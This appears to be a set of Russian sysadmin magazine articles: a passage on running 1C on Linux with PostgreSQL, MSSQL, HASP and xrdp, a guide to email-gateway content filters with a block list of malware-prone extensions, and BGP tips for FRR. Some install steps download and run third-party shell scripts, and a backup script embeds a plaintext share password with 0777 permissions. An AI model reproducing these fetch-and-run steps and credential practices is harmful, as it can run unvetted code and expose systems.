нестандартные конфигурации, то одним сервером на Linux вполне можно
обойтись. Конфигурации 1С, отличающиеся от типовых, а также некоторые
дополнительные модули и библиотеки 1С исполь зуют для обмена данными
между базами COM‐объекты. Если на твоем предприятии используется
именно такая конфигура ция (например, рас ширение или отдельная база
для обмена с «1С Мобильная торговля» либо аналогичными конфигура‐
циями), без установки 1С‐сервера на Windows не обойтись. Такой сервер
использует СУБД MSSQL,  которая,  в свою очередь, может  крутиться
на любом сервере, в том числе на Linux.
  Процесс установки 1С на Windows не представляет ни малейших слож‐
ностей, важно лишь при выборе устанавлива емых компонентов выбрать
Средства администрирования сервера, 1С‐сервер (если ставим 1С‐сервер
сразу на Windows) и сбросить фла жок уста новки драйвера защиты. Все
остальные параметры можно оста вить по умолчанию.
  Подведем промежуточный итог: у нас уста новлены серверы 1С под Win‐
dows и CentOS и сервер СУБД PostgreSQL под CentOS 7. Нас тало время соз‐
дать новую базу данных в консоли управления 1С.





                Создание БД в консоли 1С‐сервера

Внимательно прописываем имя базы (оно будет отображаться в консоли
управления 1С‐сервера), описание базы, в поле Сервер баз данных можно
вбить IP‐адрес СУБД сервера, если это не одна и та же машина, или имя сер‐
вера (в этом случае не забудь предварительно настроить DNS или файл
hosts). В поле База  данных вво дим имя базы данных для PostgreSQL.
Пользователь сервера БД для PostgreSQL — это postgres, а пароль этой
учетки мы задавали при установке. В Microsoft SQL пользователя зовут sa,
а его пароль также зада ется в процессе установки сервера. Далее опци‐
онально выбираем раздачу лицензий сервером 1С. Устанавливаем флажок
Создать базу данных в случае ее отсутствия и нажимаем ОК. Аналогич‐
ным образом создаем необ ходимое количество баз.
   Теперь нужно позабо тить ся о резервных копи ях. Сущес твует несколько
путей решения этой задачи. Можно бекапить сервер целиком (это особенно
удобно, если сервер развернут на вир туальной машине), а можно бекапить
только базы. Мы будем сохранять в резервной копии и то и другое! Бекап
сервера целиком мы рассмотрим в самом конце, ког да все настроим, а сей‐
час займемся бекапом баз PostgreSQL.


БЕКАПИМ БАЗЫ POSTGRESQL
Для организации резервного копирования БД существует множество раз‐
личных программ. Но, как мне кажет ся, для такой прос той задачи совсем
необязательно ставить какое‐то дополнительное ПО, тем более в Postgres
есть специальная утилита pg_dump. Поэтому мы напишем небольшой скрипт,
который будет бекапить базу и сохранять ее туда, куда нам нужно.
  Предварительно подготовим место, куда будем складывать резервные
копии. Предположим, в нашей сети есть сервер samba с разграничением дос‐
тупа. Создадим на этом сервере пользователя backup с паролем password.
Теперь создадим серверную папку /home/samba/backup/pgsql/, в которую
разрешим запись толь ко это му пользователю.
  Следующим шагом настро им в CentOS с сервером 1С поддержку samba:


$ sudo yum install cifs‐utils

Пускай временным катало гом у нас будет /var/backup. В таком случае
скрипт для резервного копирования баз данных будет выглядеть следующим
образом:


#!/bin/bash
timed=$(date +%Y‐%m‐%d‐%k‐%M) # определяем время начала скрипта для
дальнейшей подстановки в имя дампа
mountpoint=$(df ‐h | grep backup) # определяем, подключена ли шара
t="base1_$timed.sql.tgz"
h="base2_$timed.sql.tgz"
r="base3_$timed.sql.tgz"
a="base4_$timed.sql.tgz" # задаем переменные для имен файлов
созданных дампов (в принципе, этого можно не делать, а подставить
выражение base1_$time.sql.tgz непосредственно в pg_dump).


if [ ‐n "$mountpoint" ]; then # проверяем условие — подключена ли
шара
    echo "Снимаю дамп баз данных"
    sudo ‐u postgres pg_dump ‐Fc ‐U postgres ‐v ‐b ‐f /var/backup/$t
base1
    sudo ‐u postgres pg_dump ‐Fc ‐U postgres ‐v ‐b ‐f /var/backup/$h
base2
    sudo ‐u postgres pg_dump ‐Fc ‐U postgres ‐v ‐b ‐f /var/backup/$r
base3
    sudo ‐u postgres pg_dump ‐Fc ‐U postgres ‐v ‐b ‐f /var/backup/$a
base4
    # если шара подключена, снимаем резервные копии
    echo "Копирую резервные копии в хранилище бекапов"
    sudo cp /var/backup/{$t,$h,$r,$a} /mnt/backpgsql/ # копируем
резервные копии на удаленную шару (для особо параноидальных админов
можно делать это через SSH, только заранее необходимо сгенерировать
и подсунуть ключи).
    echo "Удаляю временные файлы"
    sudo rm ‐r /var/backup/* # удаляем резервные копии из нашего
временного каталога
    exit
else
    echo "Подключаю хранилище бекапов" # если шара не подключена, то
сначала подключим ее, а далее все то же самое, что и в первой части
скрипта
    sudo mount  ‐t cifs //192.168.1.1/backup/pgsql/ /mnt/backpgsql/
‐o username=backup,password=password,iocharset=utf8,file_mode=0777,
dir_mode=0777
    echo "Снимаю дамп баз данных"
    sudo ‐u postgres pg_dump ‐Fc ‐U postgres ‐v ‐b ‐f /var/backup/$t
torg
    sudo ‐u postgres pg_dump ‐Fc ‐U postgres ‐v ‐b ‐f /var/backup/$h
him
    sudo ‐u postgres pg_dump ‐Fc ‐U postgres ‐v ‐b ‐f /var/backup/$r
roznitsya
    sudo ‐u postgres pg_dump ‐Fc ‐U postgres ‐v ‐b ‐f /var/backup/$a
accounting
    echo "Копирую резервные копии в хранилище бекапов"
    sudo cp /var/backup/{$t,$h,$r,$a} /mnt/backpgsql/
    echo "Удаляю временные файлы"
    sudo rm ‐r /var/backup/*
    exit
fi

Сохраняем скрипт в файл /opt/backup.sh. Делаем файл исполняемым
командой sudo chmod +x /opt/backup.sh и добавляем в crontab такую
строку:


0 23 * * * /opt/backup.sh

Запускать скрипт мы будем каждый день в 23:00. Что ж, с PostgreSQL закон‐
чили. Идем дальше.


HASP
Для нормальной работы сервера 1С необ ходимо установить в системе
менеджер лицензий HASP LM. В CentOS это дела ется при помощи двух
команд:


$ wget http://centos.name/file/hasplm_install.sh
$ sh hasplm_install.sh

В моем случае на физическом хос те установлена ОС Ubuntu 16.04, внутри
которой крутятся две виртуальные машины с CentOS. На одной работают
серверы 1C и СУБД, на вто рой — Windows Server 2008. Можно пробросить
USB‐ключ 1С прямо в виртуалку (виртуализация KVM, libvirt‐bin), а можно
установить HASP LM в хос товую систему Ubuntu, что мы и сделаем.
  Заходим по адресу http://ftp.etersoft.ru/pub/Etersoft/HASP/last/
Ubuntu/ и выбираем нужную версию Ubuntu. Внут ри выб ранной папки обна‐
ружится два файла, выкачиваем оба с помощью wget:


$ wget haspd‐modules_7.40‐eter10ubuntu_i386.deb
$ wget haspd_7.40‐eter10ubuntu_i386.deb

Далее командой dpkg ‐i /haspd* устанавлива ем оба пакета. Если возника‐
ют ошибки, необходимо определить зависимости:


$ sudo apt ‐f install

Еще может потребовать ся подключить архитектуру i386:


$ sudo dpkg ‐‐add‐architecture i386

Или установить на всякий случай следующую биб лиотеку:


$ sudo apt‐get install libc6:i386

Открыв браузер и набрав IP‐адрес сервера, на порту 1947 мы можем уви деть
страницу сервиса, на которой отобража ются только новые ключи. А можем
и ничего не увидеть, в этом случае придет ся пробрасывать порты через SSH:


$ ssh admin@192.168.1.1 ‐L 8888:localhost:1947 ‐N

Где:
 • ssh — установка соединения SSH;
 • admin — логин на сервере, откуда пробрасыва ется порт;
 • 192.168.1.1 — IP‐адрес сервера, отку да пробрасывается порт;
 • L — этот ключ говорит о том, что нужно с уда лен ной машины пробросить
   порт на локальную (ключ R , наобо рот, проб расывает локальный порт
   на удаленную машину);
 • localhost — указывает на то, что нам нуж но пробросить порт самого
   сервера;
 • 1947 — пробрасываемый порт, к которому нужно получить доступ;
 • N — этот ключ блокирует вывод в консоль терминала, чтобы не устанав‐
   ливать полноценную SSH‐сессию.

Теперь можно ввести в бра узере адрес http://localhost:8888, после чего
ты наконец получишь доступ к веб‐интерфейсу сервиса HASP. Разреши в нас‐
тройках вход в этот интерфейс по сети и сохрани эти настройки. Теперь мож‐
но выключить проб рос порта и заходить на стра ницу HASP прос то по IP‐адре‐
су с указанием пор та 1947.





                   Веб‐кон соль Safenet — HASP LM

Обращаю твое внимание на то, что здесь будут отображаться только новые
клю чи Safenet, и управлять доступом можно только для этих новых ключей.
Управление старыми ключами выполняется по ста ринке. Теперь добавим
в файл /etc/hasplm/hasplm.ini следующие строки:


[NHS_IP]
NHS_IP_LIMIT = 192.168.1.0/24

Этот параметр не позволит клиентам из дру гих сетей получать лицензии.
Проверить, видит ли система ключ, можно при помощи команды lsusb. Если
все хорошо, ты увидишь примерно такое сооб щение:



  Bus 001 Device 003: ID 0529:0001 Aladdin Knowledge Systems HASP copy
  protection dongle


На этом этапе можно запускать стандартные конфигурации 1С и тестировать
их. Важно лишь не забывать о нес кольких важных моментах: PostgreSQL
не умеет работать с COM, а линуксовый 1С‐сервер не умеет работать
с MSSQL, это ограничение заложено раз работчиком.
   Чтобы не плодить сервера СУБД, для 1С‐сервера под Windows в CentOS
можно установить Microsoft SQL Server Express: эта СУБД пол ностью бес плат‐
ная и для нашей небольшой базы подходит как нельзя кстати. Хороший ману‐
ал по SQL Server Express можно найти на сайте самой корпорации Microsoft,
правда представлен он на английском языке.


УСТАНАВЛИВАЕМ SQL SERVER EXPRESS
Чтобы сервер 1С под Windows мог работать с базами данных на Linux‐сер‐
вере, нужно проделать следующие несложные манипуляции. Подключаем
репозиторий:


$ sudo curl ‐o /etc/yum.repos.d/mssql‐server.repo https://packages.
microsoft.com/config/rhel/7/mssql‐server‐2017.repo

Устанавливаем MSSQL‐сервер:


$ sudo yum install ‐y mssql‐server

Теперь нам  необ ходимо  сконфигурировать  толь ко  что  установленный
MSSQL‐сервер:


$ sudo /opt/mssql/bin/mssql‐conf setup

Отвечаем на вопросы системы. Нас спросят о том, какая сборка использует‐
ся на нашем сервере и какую версию мы хотим уста новить (выбираем MSSQL
Express — так как он бесплатен и отвечает нашим требованиям). После этого
можно установить в Windows программу Microsoft SQL Server Management
Studio и подключиться к серверу по его IP‐адресу с использованием логина
sa и пароля, указанного в процессе создания базы. Аналогично тому, как мы
делали это в PostgreSQL, в консоли Windows‐сервера 1С создаем и подклю‐
чаем базу MSSQL.
  В результате мы имеем связ ку из двух серверов. На одном у нас установ‐
лена CentOS с сервером 1С и двумя СУБД — PostgreSQL и MSSQL. Вто‐
рой 1С‐сервер работает на Windows, нужен он только для одной базы
MSSQL, поскольку в PostgreSQL не поддерживается COM.
  Осталось дело за малым. Раз уж мы потратили деньги на покупку Windows
Server, сервер терминалов сделаем на Linux.


СЕРВЕР ТЕРМИНАЛОВ ДОМЕННЫХ ПОЛЬЗОВАТЕЛЕЙ XRDP
Для установки XRDP‐сервера у нас, как это обычно бывает в Linux, есть
несколько путей. В большинс тве дистри бути вов Linux его можно установить
пакетом, например в Debian/Ubuntu это делается следующей командой:


$ sudo apt install xrdp

А можно пойти по пути сборки пакета или установки из скрипта:


$ wget http://adminguide.ru/wp‐content/uploads/2018/11/
install‐xrdp‐2.2.zip
$ unzip ./install‐xrdp‐2.2.zip
$ chmod +x install‐xrdp‐2.2.sh && ./install‐xrdp‐2.2.sh

Если сводить баланс в 1С ты планиру ешь под веселую музычку, для чего
потребуется использование колонок или наушников с удаленной системы,
нужно установить пакет xrdp‐pulseaudio‐installer.
  В процессе установки все необходимые пароли будут запрошены авто‐
матически. После установки пробуем подключить ся к серверу любым удоб‐
ным RDP‐клиентом:





                     Окно локскри на XPDP

Перед подклю чением необходимо убедиться, что выбрана нужная раскладка
клавиатуры для ввода пароля в RDP‐сессию, пос кольку на этапе локс крина
переключить язык не удастся.





                 Успешный вход в RDP‐сессию XFCE4

Никаких лицензий в данном случае не требует ся! Теперь запускаем 1С и спо‐
койно работаем. По большому счету интерфейс 1С в Linux ничем не отличает‐
ся от 1C в Windows.


ИТОГИ
Для небольшого предприятия уста новка 1С на Linux‐сервер позволит опти‐
мизировать затраты, пос кольку версия программы для Linux по своим фун‐
кциям позволяет решать большинс тво типичных бухгалтерских задач. Если
принципиально необ ходимо реализовать обмен данными между базами
с использованием COM‐объектов, без 1С‐сервера под виндой обойтись
не удастся. В этом случае СУБД MSSQL можно развернуть на Linux‐сервере.
Ну а сэкономленные средс тва тратим на пиво раз витие IT‐инфраструктуры
или закупку нового оборудования, которо го, как известно, никогда не бывает
достаточно.
АДМИН





 Сергей Сторчак
   @ser_storchak




ШЛЮЗ
БЕЗОПАСНОСТИ
ЗАЩИЩАЕМ РАБОЧУЮ ПОЧТУ ПРИ ПОМОЩИ
КАСТОМНЫХ ФИЛЬТРОВ КОНТЕНТА




Если верить базе дан ных MITRE, многие APT‐группировки
начинают свои атаки с фишинговых рассылок на корпоратив‐
ную почту. Но даже если таргетированные атаки — это не
про твою контору, в ящики все рав но непрерывно сыпется
спам, фишинговые письма и про чая зараза. Чтобы защитить
пользователей, существуют шлюзы безопасности, или Email
Security Gateway. Но пользу они приносят, только если их
грамотно настроить. Об этом и поговорим.


Вот список полезных качеств и воз можнос тей, которы ми должен обладать
современный почтовый шлюз корпоративного уровня:
 • встроенные политики безопасности;
 • антивирусные модули;
 • «песочница»;
 • репутационные фильтры;
 • черные списки;
 • настройка SPF, DKIM и DMARC;
 • блокировка исходящего спама;
 • карантин;
 • поддержка SNMP;
 • интеграция с другими средс тва ми защиты;
 • управление через интерфейс командной строки либо веб‐консоль;
 • возможность создания собственных контент‐фильтров.

Мы подробно поговорим именно о последнем. С помощью пользовательских
контент‐фильтров можно создавать правила для блокировки сообщений
по различным признакам. Сервер будет искать их в слу жебных заголовках,
теме или теле письма. Такие фильтры пригодят ся для борьбы с однотипными
атаками или в качестве временной меры.


           WARNING

                   Помни  о  существовании  статьи  138  УК РФ
                     «Нарушение   тайны   переписки,  телефонных
                       переговоров, почтовых, телеграфных или иных
                      сообщений».  Чтобы  соблюсти  закон,  следует
                        задокументировать контроль и мониторинг поч‐
                        тового трафика в частных политиках по информа‐
                      ционной безопасности компании. И ознакомить
                        с этими политиками работников под расписку.



СОВЕТЫ ПО НАСТРОЙКЕ ФИЛЬТРОВ
Прежде чем активировать контент‐фильтр на бло кировку, необходимо убе‐
диться, что он работает, и пос троить белый список таким образом, чтобы
было как можно меньше ложных срабатываний.
  Я рекомендую тестировать каждый пользовательский фильтр в течение
трех месяцев, отправляя копию писем на ручной анализ. Когда этот срок
закончится, лучше перенаправлять сооб щения в карантин, чтобы у тебя была
возможность вытащить их оттуда, если ложное срабаты вание все же слу чит‐
ся — или того потребует расследова ние инци дента.
   Кстати, хорошая практика — разрешить каж дому пользователю смотреть
свои письма, попавшие в карантин. Для этого нужно будет проинструк‐
тировать сотрудников о работе с ним.
  Каждый контентный фильтр имеет свой порядковый номер, который можно
менять. В начало списка рекомендую ставить контент‐фильтр с белыми спис‐
ками, затем с черным. Для удобства я под каж дый фильтр создаю белый спи‐
сок, что позволяет оперативно добавлять в него «белые» ящики и удалять
список, когда в правиле, под которое оно соз давалось, уже нет необ‐
ходимости.
  Список в итоге выглядит примерно так:
 • Whitelist_Case_1
 • Whitelist_Case_2
 • Whitelist_Case_3
 • Blacklist
 • Content_Filter_Case_1
 • Content_Filter_Case_2
 • Content_Filter_Case_3

Можно после каждого белого списка расположить соответству ющий ему кон‐
тент‐фильтр, например, пос ле Whitelist_Case_1 поставить Content_Fil‐
ter_Case_1, но тогда у тебя в белых списках будут дублироваться десятки,
а то и сотни почтовых адресов, что может ска зать ся на производительности.
Да и в белый список нужно добавлять только тех отправите лей, с которыми
регулярно ведется переписка.
  Я разберу несколь ко примеров из практики, которые позволят про‐
демонстрировать потенциал почтового шлюза.


Со вет 1. Бло кируй запаро лен ные файлы
Здесь все достаточно прос то: отсеиваем пись ма, к которым при ложен файл,
закрытый паролем. Это зачас тую архив, но могут быть и офис ные документы
и PDF. В моей практике чаще всего попадались пись ма с вложением в виде
запароленного архива, а сам пароль прилагал ся в теле письма. Ну а в архиве,
как правило, вирус‐шифровальщик.





                Запаро ленный вирус‐шифровальщик


Со вет 2. Добавь список запрещен ных расширений
Еще один полезный контент‐филь тр будет содержать все рас ширения,
которые часто исполь зуются для рас простра нения вредоносов и почти никог‐
да — для чего‐то полезного. Вот лишь небольшой список: ade, ace, applica‐
tion, adp, apk, bat, bin, cmd, cmdline, cpl, cab, cgi, chm, class, com, docm, dll,
dat, drv, exe, inf, ins, isp, iso, hta, hlp, lnk, lib, lzh, js, jse, jar, mde, mst, msi, msc, gz,
ocx, pub, pptm, pif, pem, potm, ps1, ps2, reg, rdp, sldm, scf, scr, sct, shb, sys, swf,
sh, tmp, vb, vbe, vbs, vxd, wsc, wsh, wsf, xlsm, xlam.
   Расширенный вариант такого списка можно найти на сайтах производите‐
лей средств защиты, например  у Symantec. Иногда  что‐то почерпнуть
для своего списка можно из аналитичес ких и исследовательских статей. Нап‐
ример, я добавил блокировку рас ширений VHD и VHDX, прочитав иссле дова‐
ние о них.
   У каждой компании такой список будет свой в силу специфики биз‐
нес‐процессов. У меня он нас читывает порядка 200 расширений.
  Прежде чем блокиро вать какое‐то расширение, необходимо убедиться,
что за последний год писем с такими файлами не было или их был минимум.
Сделать это можно с помощью журнала отслежива ния сообщений (message
tracking log). Ну и, конечно, не сто ит блокировать «офисные» расширения,
которые часто исполь зуются для целенаправленных атак, вроде  .rtf, .doc
и .pdf. Для защиты от нестандартных атак необ ходимо использовать эше‐
лонированную оборону, тема которой выходит за рамки этой статьи.
   Если в компании в качестве основного почтового клиента используется
Outlook, часть расширений в нем блокируются по умолчанию, так что нет
необходимости дублировать их в филь тре.
  Обычно  правила  кон тент‐филь тра  работа ют  на  основе  регулярных
выражений, поэтому убедись, что твои регулярки отлавливают имена рас‐
ширений, написанные и заг лавными, и строчными буквами (например, .scr
или .SCR), и анализируют именно рас ширение, а не название файла целиком.
Иначе получишь ложные срабатывания — на файлы вроде screensaver.txt.


Со вет 3. Включи в фильтры топ спамерских доменов верхне го
уровня
К своему удивлению я обнаружил, что встро енные механиз мы защиты поч‐
товых шлюзов справляются не со всем спамом — иногда даже очевидный
мусор проходит мимо них. Поэтому я решил сделать фильтр, основанный
на первой десятке доменов верхнего уровня (TLD), с которых, по версии
Spamhaus, чаще всего приходит спам (обновление списка происходит еже‐
месячно). Такой контент‐филь тр не должен давать почти никаких ложных сра‐
батываний — за исключением случаев, когда блокируются TLD‐домены тех
стран, с которыми может сотрудничать компания. В моем случае это был
домен верхнего уровня .asia.


Со вет 4. Составь список запрещен ных слов и фраз
Вот уже на протяжении полугода сотрудникам компании, где я работаю, прак‐
тически ежедневно приходят письма, в которых говорится о взломе устрой‐
ства пользователя и о его пристрастии к порно. За то, чтобы компромети‐
рующее видео не распростра нилось по контактам из адресной книги, зло‐
умышленники требуют выкуп в биткоинах. В содержании меняется только
номер кошелька. Есть подоз рение, что зло умышленники используют какой‐то
готовый фреймворк.
   Если в твоей компании не интересуются биткоина ми по работе, то можно
применить радикальные меры — например, блокировать письма, содер‐
жащие в теле слова «btc» и «bitcoin». Под такой контент‐фильтр попадут в том
числе и новостные рассылки с упомина нием этих слов. Чуть более щадящий
способ — блокировка по фра зам «bitcoin address» или «btc wallet».
   Кстати, буквально на днях с помощью контент‐фильтра из первого совета
я отловил модифицированную вер сию рассылки: PDF, защищенный паролем.
При вводе пароля получаешь похожее сооб щение с требованием выкупа.





                       Запаро ленный PDF


Со вет 5. Можешь запретить перенаправле ние лич ных писем
на рабочую поч ту
Если в твоей организации запрещено обра баты вать данные, не свя занные
с работой (чтение рассылок жен ской/муж ской тематики, получение уведом‐
лений с социальных сетей, обмен сооб щениями личного характера и т. п.), то
выручит еще один филь тр. Будем бло кировать письма, которые содержат
дополнительный служебный заголо вок X‐ResentFrom. В этом заголовке ука‐
зывается адрес переславшего.
  На практике был свидетелем случая, когда пользователю, настроившему
пересылку сообщений с личного ящика на корпоративный, ежемесячно при‐
ходило свыше 500 таких писем. Интерес но, когда он успевал работать?


Филь тры, которые не взле тели
Из‐за большого количества ложных срабатываний на стадии тестирования
пришлось отказаться от некото рых контент‐фильтров. Например, неудачной
оказалась идея блокировать все пос лания, во вложениях которых есть мак‐
росы, а также сооб щения с сокращен ными ссылками и ссылками на облачные
хранилища. В качестве компенсации можешь использовать «песочницу»
и endpoint‐решения.



КАК АНАЛИЗИРОВАТЬ ЗАБЛОКИРОВАННЫЕ ПИСЬМА, ЕСЛИ НЕТ
ПЕСОЧНИЦЫ?
Если в твоей компании по каким‐то причинам нельзя настроить карантин
и научить всех им пользоваться, то нужно придумать, как обрабаты вать заб‐
локированные письма. Вот последовательность шагов, с помощью которой
можно это делать.
 • Убедись, что с заблокированным адресатом ранее не велась переписка.
 • Проверь, не содержится ли e‐mail в базе утечек «Have I Been Pwned».
 • Отправь хеш вло жения на проверку в VirusTotal.
 • Если вложение не содержит сведений конфиденциального характера,
   отправь его на проверку в бесплатную веб‐песочницу типа ANY.RUN, Hy‐
   brid Analysis и т. д.
 • В конце концов, можешь свя заться с пользователем и узнать напрямую,
   знает ли он отправителя и ждет ли он такое письмо.


ЗАКЛЮЧЕНИЕ
Грамотно настроенный шлюз поможет отсечь мас су нежелательной кор‐
респонденции и повысить общую защищенность компании. Надеюсь, мой
мини‐гайд поможет тебе в этом деле. Если у тебя есть свои рецепты
или идеи, делись ими в комментариях!
АДМИН





                                                                      Даниил Батурин
                                                                               Координатор проекта VyOS
                                                                                                        (https://vyos.io), «языковед»,
                                                                                функциональщик, иногда
                                                                                    сетевой администратор
                                                                                                    daniil@baturin.org

       BORDER
       GATEWAY
      PROTOCOL

        ИЗУЧАЕМ ХИТРОСТИ И ОБХОДИМ
                ПОДВОДНЫЕ КАМНИ




BGP — единс твенный про токол гло бальной маршрутизации
в интернете,  так  что если ты зарегистрировал в RIPE
или ином RIR автономную систему, то неизбежно с ним стол‐
кнешься. Ни один другой протокол не пре доставляет столько
возможностей фильтрации и модификации маршрутов. Но у
гибкости  есть и обратная  сто рона —  в опци ях  легко
запутаться. Сегодня мы рассмотрим некоторые распростра‐
ненные проблемы и пути их решения.


Для примеров настроек мы будем использовать сво бодную реализацию сте‐
ка протоколов FreeRangeRouting, которая работает на Unix‐подобных сис‐
темах и используется в специализированных сетевых дис трибутивах Linux,
например Cumulus Linux и VyOS.


АВТОНОМНАЯ СИСТЕМА С НЕСВЯЗАННЫМИ ЧАСТЯМИ
Считается, что все части автономной системы напрямую свя заны между
собой. Однако в ряде случаев приходится отступать от этого правила.
При поэтапной миграции в другой датацентр это неизбежно. Точки при сутс‐
твия в разных датацентрах с одним номером AS — нежелательная, но допус‐
тимая ситуация.
   Казалось  бы,  достаточно  разбить  сеть  на  части —  к  при меру,
192.0.2.0/24 на 192.0.2.0/25 и 192.0.2.128/25, — настроить новый маршру‐
тизатор на допол нитель ной точке присутс твия и начать анонсировать отту‐
да 192.0.2.128/25. Но не все так прос то: с параметрами по умолчанию все
в интернете будут видеть обе части AS, но твои собс твенные маршрутизаторы
потеряют связь друг с дру гом.
  Почему это происходит? Предположим, ты используешь номер автоном‐
ной  системы  64500.  Пусть между  ее  частями  находится  провай дер
с номером 64501. Тогда AS path будет выглядеть так: 64500 64501 64500.
  AS path в BGP — не толь ко критерий выбора путей, но и механизм предот‐
вращения петель. Если вспомнить про заложенное в протокол пред положе‐
ние, что все части AS свя заны напрямую, наш путь выглядит именно как петля.
  Реализации BGP считают закольцованным и отбрасывают любой маршрут,
где один и тот же номер AS встречается в пути более одного раза. Но также
они часто предоставляют возможность отказаться от заданного по умол‐
чанию заведомо безопас ного поведения. Этот случай — один из них. Опция
обычно называется allowas‐in. В качестве параметра она принимает мак‐
симально допустимое число дуб лированных номеров AS. Настроим ее, чтобы
две одинаковые AS в пути не считались петлей:


router bgp 64496
 neighbor 192.0.2.1 remote‐as 64500
 !
 address‐family ipv4 unicast
  neighbor 192.0.2.1 allowas‐in 2
 exit‐address‐family

Конечно, с такими настройками твой маршру тизатор может начать пропус‐
кать и настоящие закольцованные маршру ты. К счастью, на практике они
в большом интернете не встречаются: транзитные провайдеры подобные
опции не включают и правиль но делают. Во внутренней же сети тебе ничто
не мешает присвоить каж дой независимой час ти отдельный номер AS из
частного диапазона (64512–65534).


AS PATH PREPEND И КОНТРОЛЬ НАД ВХОДЯЩИМ ТРАФИКОМ
Механизмы контроля над исходящим трафиком в BGP многочис ленны и раз‐
нообразны. Входящий тра фик — совсем другая история. В публичном
интернете у тебя нет никаких спо собов прямого контроля над ним. Автоном‐
ные системы на то и автономные, что не могут диктовать друг другу политики
маршрутизации.
   У любой автономной системы, одна ко, есть контроль над длиной AS path
в исходящих анонсах, и это можно использовать как косвенный механизм
контроля.
   Как мы уже видели, один и тот же номер AS не может появляться в пути
дважды в разных местах (то есть когда между экземплярами одного номера
есть третий), иначе такой путь считается закольцованным. Однако несколько
экземпляров одного номера подряд петлей не счи таются. Путь вроде 64500
64500  64555  64501 не вызовет у реализаций BGP никаких возражений.
При этом две одинаковые AS не считаются за одну, так что этот путь будет
длиннее, чем 64500 64555 64501.
  Искусственное удлинение пути называ ется AS path prepend и час то
используется для влияния на выбор пути дру гими сетями. Если у тебя два
провайдера и одному ты анонсиру ешь с путем 64500, а второму с 64500
64500, маршрут через первого будет выглядеть для других сетей более прив‐
лекательным. По крайней мере, в теории.
   Вот так в FRR можно сделать путь на три номера AS длиннее, чем он есть:


!
route‐map Transit‐Out permit 10
 set as‐path prepend 64496 64496 64496
!
router bgp 64496
 neighbor 192.0.2.1 remote‐as 64500
 !
 address‐family ipv4 unicast
  neighbor 192.0.2.1 route‐map Transit‐Out out
 exit‐address‐family

Теперь в show ip bgp мы увидим на выходе путь из трех копий нашей AS
вместо обычного для локальных анонсов пус того пути:


# show ip bgp neighbors 192.0.2.1 advertised‐routes
   Network          Next Hop            Metric LocPrf Weight Path
*> 203.0.113.0/24   0.0.0.0                  0         32768 64496
64496 64496 i

На практике никаких гарантий, что весь входящий трафик пойдет через пер‐
вого провайдера, у тебя нет. Вполне может ока зать ся, что для второго про‐
вайдера искусственно удлиненный путь все равно короче альтернативных,
пришедших к нему от первого через цепочку дру гих провайдеров. Кроме
того, все администраторы имеют полное право нас троить «неправильный»
с твоей точки зре ния маршрут как предпочтитель ный.
   Так что более разумно использовать т. н. community strings, если твой
транзитный провайдер их поддерживает.


COMMUNITY STRINGS
В отличие от всех осталь ных протоколов, в BGP есть механизм, который поз‐
воляет влиять на политику маршру тизации соседа, если сосед на это сог‐
ласен.
   Community strings — это произвольные значения вида AS:NUMBER (вро‐
де 64500:111), которые можно присвоить анонсам на выходе и использовать
в качестве критерия в политике на вхо де. В общем случае смысл конкретных
значений опре деляется настройками, хотя и существует несколько стандар‐
тных значений, к примеру no‐advertise, которое говорит маршру тизатору
не распространять анонс остальным.
   Транзитные провайдеры  час то  предос тавляют  клиентам  такую  воз‐
можность. В разделе BGP Services/Features в Cogent User Guide (двадцатая
страница)  можно   увидеть   целый   набор   опций   для   установки
local preference и контроля над тем, кому Cogent будет анонсировать твой
маршрут (никому, всем, отдельным регионам мира). У других провайдеров
тоже обычно есть подобные документы — вот, к примеру, для российского
RETN.
  Предположим, ты хочешь дать сво им соседям возможность выставить
local preference на тво ей стороне для их анонсов. Пусть твоя автономная
система — 64500, а у клиента — 64496.
  Сначала рассмотрим, как со стороны клиента отправить провайдеру стро‐
ку. Отправим условному провайдеру анонс с community  64500:50. Вот
как это можно сделать в FRR:


route‐map Transit‐Out permit 10
 set community 64500:50
!
router bgp 64496
 neighbor 192.0.2.1 remote‐as 64500
 !
 address‐family ipv4 unicast
  neighbor 192.0.2.1 route‐map Transit‐Out out
 exit‐address‐family

Теперь рассмотрим, как ее использовать для определения политик на сто‐
роне провайдера. Установим local preference для анонсов с такой строкой
в 50 (меньше значения по умолчанию):


bgp community‐list expanded Customer‐Policy permit 64500:50
!
route‐map Customer‐Import permit 10
 match community Customer‐Policy
 set local‐preference 50
!


router bgp 64500
 neighbor 192.0.2.10 remote‐as 64496
 !
 address‐family ipv4 unicast
  neighbor 192.0.2.10 route‐map Customer‐Import in
 exit‐address‐family
!

Убедиться, что на провайдерской стороне все работает, можно все той же
командой show ip bgp:


# show ip bgp
   Network          Next Hop            Metric LocPrf Weight Path
*> 203.0.113.0/24   192.0.2.10               0     50      0 64496 i


СТАНДАРТНЫЕ ОГРАНИЧЕНИЯ И ПУТИ ИХ ОБХОДА
В динамической маршрутиза ции есть множество способов наделать ошибок,
поэтому  реализации  про токолов  включают  стандартные  ограничения
для предотвращения типичных проблем. В то же время граница между ошиб‐
кой и необычной, но осмысленной настройкой быва ет тонкой.
  В качестве примера рас смот рим опцию ebgp‐multihop. По умолчанию
BGP откажется устанавливать соединение с соседом, если он не находится
в одном сегменте канального уровня (то есть меж ду соседя ми есть промежу‐
точные маршрутизаторы). Обычно это вполне логичная политика: маршру‐
тизировать трафик через кого‐то, кто с тобой не в одной сети, очевидно
невозможно.
  Однако BGP достаточно абстрактный про токол по сравнению со все ми
остальными и позволяет уста новить для маршру тов свой шлюз. Из‐за этого
BGP нередко исполь зуют как метод авто матичес кой передачи списков сетей,
а что с этими сетями делать, каждый уже реша ет сам.
  Компания Team Cymru таким способом предос тавляет всем желающим ак‐
туальные списки сетей, которые еще не выделены ни одной компании
и поэтому не дол жны появлять ся в интернете, — если к тебе приходит трафик
из них, это явный признак IP spooﬁng.
  Поскольку их сервер маршру тов находится где‐то далеко в интернете
и маршрутизировать тра фик через него самого не предполагается, ограниче‐
ние на нахождение соседей в одной сети к нему неприменимо. В этом слу чае
нам и поможет опция ebgp‐multihop, которая устанавливает максимально
допустимое число промежуточных маршру тиза торов:


router bgp 64496
 neighbor 192.0.2.1 remote‐as 64500
 neighbor 192.0.2.1 ebgp‐multihop 255


СМОТРИМ НА СЕБЯ ИЗВНЕ
Многие наверняка видели инс тру менты типа  looking  glass. Провайдеры
нередко предоставляют интерфейс, с которого мож но запустить ping и tracer‐
oute к указанному адресу из их сети. Обычно ничего дру гого и не нужно,
но для отладки политик маршрутизации бывает полез но увидеть AS path.
К счастью, транзитные провайдеры обычно дают и такую возможность. К при‐
меру: Level3, Telia, Hurricane Electric.
